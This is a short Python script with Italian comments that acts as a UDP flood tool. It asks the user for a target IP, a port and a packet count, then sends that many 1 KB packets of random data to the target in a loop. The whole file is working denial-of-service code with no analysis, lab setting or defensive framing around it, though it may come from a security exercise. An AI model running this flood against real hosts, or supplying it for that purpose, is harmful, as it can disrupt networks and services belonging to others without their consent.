import socket
import random

def main():
    # Richiesta all'utente dell'IP e della porta della macchina target
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Quanti pacchetti da 1 KB inviare? "))

    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Creazione di un pacchetto di 1 KB
    packet_size = 1024  # 1 KB
    packet_data = random.randbytes(packet_size)  # Genera dati casuali di 1 KB

    print(f"Inizio a inviare {num_packets} pacchetti a {target_ip}:{target_port}")

    # Invio dei pacchetti
    for _ in range(num_packets):
        sock.sendto(packet_data, (target_ip, target_port))

    print("Invio completato.")

if __name__ == "__main__":
    main()